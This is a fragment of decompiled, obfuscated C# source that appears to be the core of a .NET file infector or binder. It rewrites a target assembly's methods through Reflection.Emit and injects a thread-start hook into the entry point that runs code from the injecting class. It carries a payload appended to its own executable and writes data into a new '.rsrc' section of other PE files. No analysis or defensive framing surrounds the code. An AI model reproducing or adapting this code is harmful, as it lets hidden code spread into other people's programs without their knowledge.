	}

	private static void syfVsThvbcwkBq(Type type, Type wrapperType, ModuleReader reader, Assembly asm, ref AssemblyBuilder ab, bool setEP, PEFileKinds filetype, nnqpftdznilo objects)
	{
		string fullName = type.FullName;
		if ((object)wrapperType == null && -1 != fullName.IndexOf("+"))
		{
			return;
		}
		ConstructorInfo[] constructors = type.GetConstructors(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
		ConstructorInfo[] array = constructors;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				ConstructorInfo constructorInfo = array[num];
				ConstructorBuilder constructorBuilder = objects.etbaebi(type, constructorInfo);
				if ((object)constructorBuilder != null)
				{
					MethodBody methodBody = reader.GetMethodBody((MethodBase)constructorInfo);
					if (methodBody != null)
					{
						ILGenerator il = constructorBuilder.GetILGenerator();
						yqhkGlhvXlcDz(type, constructorInfo, methodBody, ref il, entrypoint: false, jwqkZocrojjQhc, objects);
					}
					num++;
					continue;
				}
				break;
			}
			MethodBase[] methods = type.GetMethods(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
			MethodBase[] array2 = methods;
			foreach (MethodBase methodBase in array2)
			{
				if (methodBase.Name == "Main" && (object)methodBase.DeclaringType == typeof(xrieopydqqcD))
				{
					continue;
				}
				MethodBuilder methodBuilder = objects.vzIyvrjxjhnz(type, methodBase);
				MethodBody methodBody2 = reader.GetMethodBody(methodBase);
				if (methodBody2 != null)
				{
					ILGenerator il2 = methodBuilder.GetILGenerator();
					if ((object)asm.EntryPoint == methodBase && setEP)
					{
						yqhkGlhvXlcDz(type, methodBase, methodBody2, ref il2, entrypoint: true, jwqkZocrojjQhc, objects);
						ab.SetEntryPoint((MethodInfo)methodBuilder, filetype);
					}
					else
					{
						yqhkGlhvXlcDz(type, methodBase, methodBody2, ref il2, entrypoint: false, jwqkZocrojjQhc, objects);
					}
				}
			}
			TypeBuilder typeBuilder = objects.xEKtafwb(type);
			try
			{
				typeBuilder.CreateType();
			}
			catch (NotSupportedException)
			{
				if (jwqkZocrojjQhc)
				{
					jwqkZocrojjQhc = false;
					break;
				}
			}
			Type[] nestedTypes = type.GetNestedTypes(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
			Type[] array3 = nestedTypes;
			foreach (Type type2 in array3)
			{
				syfVsThvbcwkBq(type2, type, reader, asm, ref ab, setEP, filetype, objects);
			}
			break;
		}
	}

	private static bool vkvAtgyut(Assembly asm)
	{
		string[] manifestResourceNames = asm.GetManifestResourceNames();
		return manifestResourceNames.Length != 0;
	}

	private static void DaSuxuoumcrbq(Assembly asm, AssemblyBuilder ab, string name)
	{
		string[] manifestResourceNames = asm.GetManifestResourceNames();
		string[] array = manifestResourceNames;
		foreach (string text in array)
		{
			Stream manifestResourceStream = asm.GetManifestResourceStream(text);
			manifestResourceStream.GetType();
			if (manifestResourceStream == null)
			{
				continue;
			}
			try
			{
				ResourceReader resourceReader = new ResourceReader(manifestResourceStream);
				Hashtable hashtable = new Hashtable();
				IDictionaryEnumerator enumerator = resourceReader.GetEnumerator();
				while (enumerator.MoveNext())
				{
					if (!hashtable.ContainsKey(enumerator.Key))
					{
						hashtable.Add(enumerator.Key, enumerator.Value);
					}
				}
				resourceReader.Close();
				string text2 = Path.GetFileNameWithoutExtension(name) + ".resources";
				File.Delete(text2);
				IResourceWriter resourceWriter = ab.DefineResource(text, "", text2);
				IDictionaryEnumerator enumerator2 = hashtable.GetEnumerator();
				enumerator2.Reset();
				while (enumerator2.MoveNext())
				{
					resourceWriter.AddResource((string)enumerator2.Key, enumerator2.Value);
				}
				resourceWriter.Close();
			}
			catch
			{
			}
		}
	}

	private static void yqhkGlhvXlcDz(Type type, MethodBase methodBase, MethodBody methodBody, ref ILGenerator il, bool entrypoint, bool shorts, nnqpftdznilo objects)
	{
		//IL_0401: Unknown result type (might be due to invalid IL or missing references)
		//IL_0407: Invalid comparison between Unknown and I4
		//IL_0434: Unknown result type (might be due to invalid IL or missing references)
		//IL_0439: Unknown result type (might be due to invalid IL or missing references)
		//IL_043b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0452: Expected I4, but got Unknown
		Type[] locals = methodBody.GetLocals();
		LocalBuilder[] array = new LocalBuilder[checked((uint)locals.Length)];
		if (locals != null && locals.Length > 0)
		{
			for (int i = 0; i < locals.Length; i++)
			{
				Type type2 = objects.xEKtafwb(locals[i]);
				if ((object)type2 != null)
				{
					array[i] = il.DeclareLocal(type2);
				}
				else
				{
					array[i] = il.DeclareLocal(locals[i]);
				}
			}
		}
		uAfzmzmprnjlw uAfzmzmprnjlw = new uAfzmzmprnjlw(il, array);
		LocalBuilder local = null;
		if (entrypoint)
		{
			MethodBuilder meth = objects.vzIyvrjxjhnz(typeof(xrieopydqqcD), Ojiwadtto);
			local = il.DeclareLocal(typeof(Thread));
			uAfzmzmprnjlw.qwghiubYc();
			il.Emit(OpCodes.Ldnull);
			uAfzmzmprnjlw.qwghiubYc();
			il.Emit(OpCodes.Ldftn, meth);
			uAfzmzmprnjlw.qwghiubYc();
			Type typeFromHandle = typeof(ThreadStart);
			ConstructorInfo[] constructors = typeFromHandle.GetConstructors();
			ConstructorInfo con = constructors[0];
			il.Emit(OpCodes.Newobj, con);
			Type[] types = new Type[1] { typeof(ThreadStart) };
			ConstructorInfo constructor = typeof(Thread).GetConstructor(types);
			il.Emit(OpCodes.Newobj, constructor);
			uAfzmzmprnjlw.qwghiubYc();
			il.Emit(OpCodes.Stloc, local);
			uAfzmzmprnjlw.qwghiubYc();
			il.Emit(OpCodes.Ldloc, local);
			MethodInfo method = typeof(Thread).GetMethod("Start");
			il.Emit(OpCodes.Callvirt, method);
			uAfzmzmprnjlw.qwghiubYc();
		}
		ExceptionHandler[] exceptions = methodBody.GetExceptions();
		if (exceptions != null)
		{
			for (int j = 0; j < exceptions.Length; j++)
			{
			}
		}
		int num = 0;
		Instruction[] instructions = methodBody.GetInstructions();
		foreach (Instruction val in instructions)
		{
			if (val.get_Code().OperandType == OperandType.ShortInlineBrTarget || val.get_Code().OperandType == OperandType.InlineBrTarget)
			{
				num++;
			}
			if (val.get_Code().OperandType == OperandType.InlineSwitch)
			{
				num += ((int[])val.get_Operand()).Length;
			}
		}
		Label[] array2;
		int[] array3;
		int num2;
		checked
		{
			array2 = new Label[(uint)num];
			array3 = new int[(uint)num];
			num2 = 0;
			instructions = methodBody.GetInstructions();
		}
		foreach (Instruction val2 in instructions)
		{
			if (val2.get_Code().OperandType == OperandType.ShortInlineBrTarget)
			{
				object operand = val2.get_Operand();
				array3[num2] = (int)operand;
				ref Label reference = ref array2[num2];
				reference = il.DefineLabel();
				num2++;
			}
			if (val2.get_Code().OperandType == OperandType.InlineBrTarget)
			{
				object operand2 = val2.get_Operand();
				array3[num2] = (int)operand2;
				ref Label reference2 = ref array2[num2];
				reference2 = il.DefineLabel();
				num2++;
			}
			if (val2.get_Code().OperandType == OperandType.InlineSwitch)
			{
				object operand3 = val2.get_Operand();
				int[] array4 = (int[])operand3;
				int[] array5 = array4;
				for (int l = 0; l < array5.Length; l++)
				{
					int num3 = (array3[num2] = array5[l]);
					ref Label reference3 = ref array2[num2];
					reference3 = il.DefineLabel();
					num2++;
				}
			}
		}
		bool flag = false;
		for (int m = 0; m < methodBody.GetInstructions().Length; m++)
		{
			if (flag)
			{
				flag = false;
				continue;
			}
			Instruction val3 = methodBody.GetInstructions()[m];
			OpCode code = val3.get_Code();
			int hashCode = code.GetHashCode();
			OpCode ldloc = OpCodes.Ldloc;
			if (hashCode == ldloc.GetHashCode() && m < methodBody.GetInstructions().Length - 1)
			{
				int hashCode2 = methodBody.GetInstructions()[m].get_Code().GetHashCode();
				ldloc = OpCodes.Pop;
				if (hashCode2 == ldloc.GetHashCode())
				{
					flag = true;
					continue;
				}
			}
			int hashCode3 = code.GetHashCode();
			ldloc = OpCodes.Nop;
			if (hashCode3 == ldloc.GetHashCode())
			{
				continue;
			}
			uAfzmzmprnjlw.qwghiubYc();
			ExceptionHandler[] array6 = exceptions;
			foreach (ExceptionHandler val4 in array6)
			{
				if (val4.get_TryOffset() != val3.get_Offset())
				{
					if ((int)val4.get_Type() == 3)
					{
						if (val4.get_FilterOffset() == val3.get_Offset())
						{
							il.BeginExceptFilterBlock();
						}
					}
					else if (val4.get_HandlerOffset() == val3.get_Offset())
					{
						ExceptionHandlerType type3 = val4.get_Type();
						switch ((int)type3)
						{
						case 0:
							il.BeginFaultBlock();
							break;
						case 1:
							il.BeginCatchBlock(val4.get_CatchType());
							break;
						case 2:
							il.BeginFinallyBlock();
							break;
						case 3:
							il.BeginExceptFilterBlock();
							break;
						}
					}
					if (val4.get_HandlerOffset() + val4.get_HandlerLength() != val3.get_Offset())
					{
						continue;
					}
					bool flag2 = true;
					ExceptionHandler[] array7 = exceptions;
					foreach (ExceptionHandler val5 in array7)
					{
						if (val5.get_HandlerOffset() == val4.get_HandlerOffset() + val4.get_HandlerLength())
						{
							flag2 = false;
						}
					}
					if (flag2)
					{
						il.EndExceptionBlock();
					}
					continue;
				}
				il.BeginExceptionBlock();
				break;
			}
			for (int n = 0; n < array3.Length; n++)
			{
				if (array3[n] == val3.get_Offset())
				{
					il.MarkLabel(array2[n]);
				}
			}
			object operand4 = val3.get_Operand();
			byte[] operandData = val3.GetOperandData();
			if (entrypoint)
			{
				string? name = code.Name;
				ldloc = OpCodes.Ret;
				if (name == ldloc.Name)
				{
					uAfzmzmprnjlw.qwghiubYc();
					il.Emit(OpCodes.Ldloc, local);
					MethodInfo method2 = typeof(Thread).GetMethod("Abort", new Type[0]);
					il.Emit(OpCodes.Callvirt, method2);
				}
			}
			if (operand4 != null)
			{
				switch (code.OperandType)
				{
				case OperandType.InlineBrTarget:
				{
					int num6 = (int)operand4;
					for (int num7 = 0; num7 < array2.Length; num7++)
					{
						if (array3[num7] == num6)
						{
							il.Emit(code, array2[num7]);
							break;
						}
					}
					break;
				}
				case OperandType.InlineI:
					il.Emit(code, (int)operand4);
					break;
				case OperandType.InlineI8:
					il.Emit(code, (long)operand4);
					break;
				case OperandType.InlineNone:
					il.Emit(code);
					break;
				case OperandType.InlineR:
					il.Emit(code, (double)operand4);
					break;
				case OperandType.InlineString:
					il.Emit(code, operand4.ToString());
					break;
				case OperandType.InlineSwitch:
				{
					int[] array8 = (int[])operand4;
					Label[] array9 = new Label[checked((uint)array8.Length)];
					for (int num8 = 0; num8 < array8.Length; num8++)
					{
						for (int num9 = 0; num9 < array2.Length; num9++)
						{
							if (array3[num9] == array8[num8])
							{
								ref Label reference4 = ref array9[num8];
								reference4 = array2[num9];
							}
						}
					}
					il.Emit(code, array9);
					break;
				}
				case OperandType.InlineField:
				case OperandType.InlineMethod:
				case OperandType.InlineSig:
				case OperandType.InlineTok:
				case OperandType.InlineType:
					if (operand4 is Type)
					{
						TypeBuilder typeBuilder = objects.xEKtafwb((Type)operand4);
						if ((object)typeBuilder != null)
						{
							il.Emit(code, typeBuilder);
							break;
						}
						if ((object)((Type)operand4).Assembly == Assembly.GetExecutingAssembly())
						{
							throw new Exception();
						}
						il.Emit(code, (Type)operand4);
					}
					else if (operand4 is MethodInfo)
					{
						MethodInfo methodInfo = (MethodInfo)operand4;
						MethodBuilder methodBuilder = objects.vzIyvrjxjhnz(methodInfo.DeclaringType, methodInfo);
						if ((object)methodBuilder != null)
						{
							il.Emit(code, methodBuilder);
							break;
						}
						if ((object)methodInfo.DeclaringType!.Assembly == Assembly.GetExecutingAssembly())
						{
							throw new Exception();
						}
						il.Emit(code, methodInfo);
					}
					else if (operand4 is MemberInfo)
					{
						if (operand4 is FieldInfo)
						{
							FieldBuilder fieldBuilder = objects.etqEvak(((FieldInfo)operand4).DeclaringType, (FieldInfo)operand4);
							if ((object)fieldBuilder != null)
							{
								il.Emit(code, fieldBuilder);
							}
							else
							{
								if ((object)((FieldInfo)operand4).DeclaringType!.Assembly == Assembly.GetExecutingAssembly())
								{
									throw new Exception();
								}
								il.Emit(code, (FieldInfo)operand4);
							}
						}
						if (!(operand4 is ConstructorInfo))
						{
							break;
						}
						ConstructorInfo constructorInfo = (ConstructorInfo)operand4;
						ConstructorBuilder constructorBuilder = objects.etbaebi(constructorInfo.DeclaringType, constructorInfo);
						if ((object)constructorBuilder != null)
						{
							il.Emit(code, constructorBuilder);
							break;
						}
						if ((object)constructorInfo.DeclaringType!.Assembly == Assembly.GetExecutingAssembly())
						{
							throw new Exception();
						}
						il.Emit(code, constructorInfo);
					}
					else if (!(operand4 is FieldInfo))
					{
						throw new Exception();
					}
					break;
				case OperandType.ShortInlineBrTarget:
				{
					OpCode opcode;
					if (!shorts)
					{
						opcode = code;
						string? name2 = code.Name;
						ldloc = OpCodes.Beq_S;
						if (name2 == ldloc.Name)
						{
							opcode = OpCodes.Beq;
						}
						string? name3 = code.Name;
						ldloc = OpCodes.Bge_S;
						if (name3 == ldloc.Name)
						{
							opcode = OpCodes.Bge;
						}
						string? name4 = code.Name;
						ldloc = OpCodes.Bge_Un_S;
						if (name4 == ldloc.Name)
						{
							opcode = OpCodes.Bge_Un;
						}
						string? name5 = code.Name;
						ldloc = OpCodes.Bgt_S;
						if (name5 == ldloc.Name)
						{
							opcode = OpCodes.Bgt_S;
						}
						string? name6 = code.Name;
						ldloc = OpCodes.Bgt_Un_S;
						if (name6 == ldloc.Name)
						{
							opcode = OpCodes.Bgt_Un;
						}
						string? name7 = code.Name;
						ldloc = OpCodes.Ble_S;
						if (name7 == ldloc.Name)
						{
							opcode = OpCodes.Ble;
						}
						string? name8 = code.Name;
						ldloc = OpCodes.Ble_Un_S;
						if (name8 == ldloc.Name)
						{
							opcode = OpCodes.Ble_Un;
						}
						string? name9 = code.Name;
						ldloc = OpCodes.Blt_S;
						if (name9 == ldloc.Name)
						{
							opcode = OpCodes.Blt;
						}
						string? name10 = code.Name;
						ldloc = OpCodes.Blt_Un_S;
						if (name10 == ldloc.Name)
						{
							opcode = OpCodes.Blt_Un;
						}
						string? name11 = code.Name;
						ldloc = OpCodes.Bne_Un_S;
						if (name11 == ldloc.Name)
						{
							opcode = OpCodes.Bne_Un;
						}
						string? name12 = code.Name;
						ldloc = OpCodes.Br_S;
						if (name12 == ldloc.Name)
						{
							opcode = OpCodes.Br;
						}
						string? name13 = code.Name;
						ldloc = OpCodes.Brfalse_S;
						if (name13 == ldloc.Name)
						{
							opcode = OpCodes.Brfalse;
						}
						string? name14 = code.Name;
						ldloc = OpCodes.Brtrue_S;
						if (name14 == ldloc.Name)
						{
							opcode = OpCodes.Brtrue;
						}
						string? name15 = code.Name;
						ldloc = OpCodes.Leave_S;
						if (name15 == ldloc.Name)
						{
							opcode = OpCodes.Leave;
						}
					}
					else
					{
						opcode = code;
					}
					int num4 = (int)operand4;
					for (int num5 = 0; num5 < array2.Length; num5++)
					{
						if (array3[num5] == num4)
						{
							il.Emit(opcode, array2[num5]);
							break;
						}
					}
					break;
				}
				case OperandType.ShortInlineI:
					if (operand4 is short)
					{
						il.Emit(code, (short)operand4);
					}
					if (operand4 is sbyte)
					{
						il.Emit(code, (sbyte)operand4);
					}
					break;
				case OperandType.ShortInlineR:
					il.Emit(code, (float)operand4);
					break;
				case OperandType.InlineVar:
				case OperandType.ShortInlineVar:
					if (operand4 is int)
					{
						if (array == null)
						{
							return;
						}
						il.Emit(code, array[(int)operand4]);
					}
					else if (operand4 is ParameterInfo)
					{
						ParameterInfo parameterInfo = (ParameterInfo)operand4;
						methodBase.GetParameters();
						int position = parameterInfo.Position;
						int hashCode4 = code.GetHashCode();
						ldloc = OpCodes.Ldarg_S;
						if (hashCode4 == ldloc.GetHashCode())
						{
							il.Emit(code, (int)operandData[0]);
						}
						else
						{
							il.Emit(code, position);
						}
					}
					break;
				}
			}
			else
			{
				il.Emit(code);
			}
		}
	}

	private static byte[] plofcXrGdqk()
	{
		FileStream fileStream = Assembly.GetExecutingAssembly().GetFiles()[0];
		BinaryReader binaryReader = new BinaryReader(fileStream);
		uodsxxuliiz uodsxxuliiz = new uodsxxuliiz();
		uodsxxuliiz.zEtgol(binaryReader);
		tbetzkWdxclu tbetzkWdxclu = new tbetzkWdxclu();
		tbetzkWdxclu.tlnpgvuqkwqot(binaryReader, uodsxxuliiz);
		cMOoOgkad cMOoOgkad = (cMOoOgkad)tbetzkWdxclu.fraswujhugwtyy[tbetzkWdxclu.fraswujhugwtyy.Count - 1];
		uint num = cMOoOgkad.zmeiajmfzkjpje + cMOoOgkad.yzpzejsLoIjz;
		binaryReader.BaseStream.Position = num;
		try
		{
			uint count = binaryReader.ReadUInt32();
			byte[] result = binaryReader.ReadBytes((int)count);
			fileStream.Close();
			return result;
		}
		catch
		{
			fileStream.Close();
			FileStream fileStream2 = new FileStream("ILReader.dll", FileMode.Open, FileAccess.Read);
			BinaryReader binaryReader2 = new BinaryReader(fileStream2);
			FileInfo fileInfo = new FileInfo("ILReader.dll");
			if (fileInfo != null)
			{
				byte[] result = binaryReader2.ReadBytes((int)fileInfo.Length);
				fileStream2.Close();
				return result;
			}
			fileStream2.Close();
			return null;
		}
	}

	private static void efZexkvcvfwmm(string fileName, byte[] ilReader)
	{
		FileStream fileStream = new FileStream(fileName, FileMode.Open, FileAccess.ReadWrite);
		BinaryWriter binaryWriter = new BinaryWriter(fileStream);
		binaryWriter.BaseStream.Seek(0L, SeekOrigin.End);
		binaryWriter.Write((uint)ilReader.Length);
		binaryWriter.Write(ilReader);
		fileStream.Close();
	}

	private static bool ajasisBxvjsdr(string inFileName, string outFileName)
	{
		FileStream fileStream = new FileStream(outFileName, FileMode.Open, FileAccess.ReadWrite);
		FileStream fileStream2 = new FileStream(inFileName, FileMode.Open, FileAccess.Read);
		if (fileStream2 != null && fileStream != null)
		{
			BinaryWriter binaryWriter = new BinaryWriter(fileStream);
			BinaryReader binaryReader = new BinaryReader(fileStream);
			BinaryReader binaryReader2 = new BinaryReader(fileStream2);
			uodsxxuliiz uodsxxuliiz = new uodsxxuliiz();
			uodsxxuliiz.zEtgol(binaryReader2);
			tbetzkWdxclu tbetzkWdxclu = new tbetzkWdxclu();
			tbetzkWdxclu.tlnpgvuqkwqot(binaryReader2, uodsxxuliiz);
			byte[] array = tbetzkWdxclu.lutszZ(binaryReader2);
			if (array == null)
			{
				return false;
			}
			uodsxxuliiz uodsxxuliiz2 = new uodsxxuliiz();
			uodsxxuliiz2.zEtgol(binaryReader);
			xdohkoinFjot xdohkoinFjot = new xdohkoinFjot();
			xdohkoinFjot.tlnpgvuqkwqot(binaryReader, uodsxxuliiz2);
			if (xdohkoinFjot.lutszZ(binaryReader) != null)
			{
				return false;
			}
			cMOoOgkad cMOoOgkad = (cMOoOgkad)xdohkoinFjot.fraswujhugwtyy[xdohkoinFjot.fraswujhugwtyy.Count - 1];
			uint num = (cMOoOgkad.zmeiajmfzkjpje + cMOoOgkad.yzpzejsLoIjz + 1) / xdohkoinFjot.qcgvnlipvlodxd * xdohkoinFjot.qcgvnlipvlodxd;
			uint phsize = ((uint)array.Length / xdohkoinFjot.qcgvnlipvlodxd + 1) * xdohkoinFjot.qcgvnlipvlodxd;
			uint wfcDkot = xdohkoinFjot.wfcDkot;
			uint isize = xdohkoinFjot.wfcDkot + ((uint)array.Length / xdohkoinFjot.oZccafviqmv + 1) * xdohkoinFjot.oZccafviqmv;
			cMOoOgkad sh = new cMOoOgkad(".rsrc", (uint)array.Length, wfcDkot, phsize, num, 1107296320u);
			Lxfiwlr d = new Lxfiwlr(wfcDkot, (uint)array.Length);
			binaryWriter.BaseStream.Position = num;
			binaryWriter.Write(array, 0, array.Length);
			for (int i = 0; i < xdohkoinFjot.qcgvnlipvlodxd - (long)array.Length % (long)xdohkoinFjot.qcgvnlipvlodxd; i++)
			{
				binaryWriter.Write((byte)0);
			}
			xdohkoinFjot.lnaqeacWglxCZk(sh, binaryReader, binaryWriter, uodsxxuliiz2);
			xdohkoinFjot.oDleyn(d, binaryWriter, uodsxxuliiz2);
			xdohkoinFjot.gilxoegqvcjfl(isize, binaryWriter, uodsxxuliiz2);
			binaryWriter.Flush();
			binaryReader.Close();
			binaryWriter.Close();
			fileStream = new FileStream(outFileName, FileMode.Open, FileAccess.ReadWrite);
			binaryReader = new BinaryReader(fileStream);
			binaryWriter = new BinaryWriter(fileStream);
			xdohkoinFjot.Rzpnwvm(num, tbetzkWdxclu.xuhigl.oKmirJgnjsztiu, wfcDkot, binaryReader, binaryWriter);
			binaryWriter.Flush();
			binaryReader2.Close();
			binaryReader.Close();
			binaryWriter.Close();
			fileStream2.Close();
			fileStream.Close();
			return true;
		}
		return false;
	}
}
